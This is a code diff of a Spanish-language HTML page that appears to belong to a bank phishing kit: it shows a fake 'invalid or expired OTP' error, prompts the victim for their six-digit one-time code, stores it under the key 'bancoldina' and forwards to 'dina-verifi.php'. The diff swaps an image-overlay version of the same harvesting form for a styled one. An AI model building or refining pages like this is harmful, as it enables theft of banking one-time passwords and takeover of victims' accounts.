@@ -1,167 +1,154 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Image-based Website</title>
-    <style>
-    * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Clave Dinámica (OTP) - Error</title>
+  <style>
+    body {
+      background-color: #fff;
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
     }
-    body, html {
-        height: 100%;
-        width: 100%;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        background-color: #f0f0f0;
-    }
-    .image-container {
-        width: 100%;
-        height: 100%;
-        overflow: hidden;
-        position: relative;
-    }
-    .image-container img {
-        width: 100%;
-        height: 100%;
-        object-fit: cover;
-    }
-    .center-box {
-        position: absolute;
-        top: 60%;
-        left: 49.7%;
-        transform: translate(-50%, -50%);
-        background-color: rgb(255, 255, 255);
-        width: 320px; /* Ajusta el tamaño según sea necesario */
-        height: 60px;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        border-radius: 8px;
-    }
-    .center-box .input-container {
-        position: relative;
-        width: 100%;
-        display: flex;
-        justify-content: space-between;
-        gap: 1px; /* Espacio entre los inputs */
-    }
-    .password-input {
-        width: 40px;
-        height: 60px;
-        text-align: center;
-        font-size: 20px;
-        border: 1px solid #dc0f0f;
-        border-radius: 5px;
-        margin-right: 10px; /* Margen entre los inputs */
-    }
-    .button-container {
-        position: absolute;
-        top: 77.5%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        display: flex;
-        flex-direction: column; /* Cambiado a 'column' para poner los botones uno debajo del otro */
-        gap: 24px; /* Espacio entre los botones */
-        transition: top 0.3s ease-in-out; /* Suavizar el movimiento */
-    }
-    .button-container button {
-        padding: 15px 120px;
-        font-size: 16px;
-        border: none;
-        border-radius: 50px;
-        font-weight: bold;
-        color: rgb(1, 1, 1);
-        cursor: pointer;
-        transition: background-color 0.3s ease;
-    }
-    .button-container button:first-child {
-        background-color: #ffda37;
-        border: 1px solid black;
-    }
-    .button-container button:first-child:hover {
-        background-color: #ffda37;
-    }
-    .button-container button:last-child {
-        background-color: #bababa;
-    }
-    .button-container button:last-child:hover {
-        background-color: #bababa;
-    }
-</style>
 
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    .step-indicator {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin: 30px 0 10px;
+    }
+
+    .circle {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      background-color: #ccc;
+      color: #fff;
+      font-size: 14px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .circle.done,
+    .circle.active {
+      background-color: #0057D8;
+    }
+
+    .line {
+      height: 2px;
+      width: 50px;
+      background-color: #ccc;
+      margin: 0 10px;
+    }
+
+    .line.done {
+      background-color: #0057D8;
+    }
+
+    .container {
+      max-width: 380px;
+      margin: 0 auto;
+      padding: 20px;
+    }
+
+    h2 {
+      font-size: 20px;
+      font-weight: bold;
+      text-align: center;
+      margin-bottom: 30px;
+    }
+
+    .error-alert {
+      background-color: #ffdddd;
+      color: #cc0000;
+      padding: 12px;
+      font-size: 14px;
+      border-radius: 8px;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .form-group {
+      margin-bottom: 25px;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 15px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      box-sizing: border-box;
+      background-color: #f5f5f5;
+    }
+
+    input[type="text"]::placeholder {
+      color: #999;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      background-color: #0057D8;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      border: none;
+      border-radius: 25px;
+      cursor: pointer;
+    }
+
+    .link {
+      display: block;
+      text-align: center;
+      margin-top: 20px;
+      color: #0057D8;
+      text-decoration: underline;
+    }
+  </style>
 </head>
 <body>
-    <div class="image-container">
-        <img src="img/cel3.jpg" alt="Background Image">
-        <div class="center-box">
-            <div class="input-container">
-                <input type="text" class="password-input" maxlength="1" id="input1" inputmode="numeric" oninput="validateInput(event)">
-                <input type="text" class="password-input" maxlength="1" id="input2" inputmode="numeric" oninput="validateInput(event)">
-                <input type="text" class="password-input" maxlength="1" id="input3" inputmode="numeric" oninput="validateInput(event)">
-                <input type="text" class="password-input" maxlength="1" id="input4" inputmode="numeric" oninput="validateInput(event)">
-                <input type="text" class="password-input" maxlength="1" id="input5" inputmode="numeric" oninput="validateInput(event)">
-                <input type="text" class="password-input" maxlength="1" id="input6" inputmode="numeric" oninput="validateInput(event)">
-            </div>
-        </div>
-        <div class="button-container">
-            <button id="continuar">Continuar</button>
-            <button id="cancelar">Cancelar</button>
-        </div>
+
+  <!-- PASOS VISUALES -->
+  <div class="step-indicator">
+    <div class="circle done">1</div>
+    <div class="line done"></div>
+    <div class="circle active">2</div>
+    <div class="line"></div>
+    <div class="circle">3</div>
+  </div>
+
+  <div class="container">
+    <div class="error-alert">
+      Su código OTP es inválido o ha expirado.<br>
+      Para seguir con su proceso financiero, por favor coloque su código correctamente.
     </div>
 
-    <script>
-        const inputs = document.querySelectorAll('.password-input');
+    <h2>Clave Dinámica (OTP)</h2>
+    <form onsubmit="guardarOtp(event)">
+      <div class="form-group">
+        <input type="text" id="otp" maxlength="6" placeholder="Ingresa tu clave dinámica (OTP)" required pattern="[0-9]*" inputmode="numeric">
+      </div>
+      <button type="submit">Continuar</button>
+    </form>
+    <a href="#" class="link">En otro momento</a>
+  </div>
 
-        inputs.forEach((input, index) => {
-            input.addEventListener('input', (e) => {
-                if (e.target.value !== '') {
-                    if (index < inputs.length - 1) {
-                        inputs[index + 1].focus();
-                    }
-                }
-            });
+  <script>
+    function guardarOtp(e) {
+      e.preventDefault();
+      const otp = document.getElementById("otp").value.trim();
 
-            input.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && index > 0) {
-                    inputs[index - 1].focus();
-                }
-            });
-        });
+      if (otp.length === 6 && /^[0-9]+$/.test(otp)) {
+        localStorage.setItem("bancoldina", otp);
+        window.location.href = "dina-verifi.php";
+      } else {
+        alert("Ingresa un código OTP válido de 6 dígitos.");
+      }
+    }
+  </script>
 
-        document.getElementById('continuar').addEventListener('click', () => {
-            const inputValues = Array.from(document.querySelectorAll('.password-input'))
-                                      .map(input => input.value)
-                                      .join('');
-            localStorage.setItem('bancoldina', inputValues);
-            window.location.href = 'dina-verifi.php';
-        });
-
-        document.getElementById('cancelar').addEventListener('click', () => {
-            window.location.href = 'index.html';
-        });
-
-        // Detectar apertura del teclado
-        window.addEventListener('resize', () => {
-            const buttonContainer = document.querySelector('.button-container');
-            if (window.innerHeight < 500) {  // Si la altura de la ventana es pequeña, el teclado está abierto
-                buttonContainer.style.top = '90%';  // Mover los botones hacia abajo
-            } else {
-                buttonContainer.style.top = '80.5%';  // Posición original
-            }
-        });
-
-        // Función para validar la entrada
-        function validateInput(event) {
-            const value = event.target.value;
-            if (isNaN(value)) {
-                event.target.value = ''; // Si no es un número, se borra
-            }
-        }
-    </script>
 </body>
 </html>
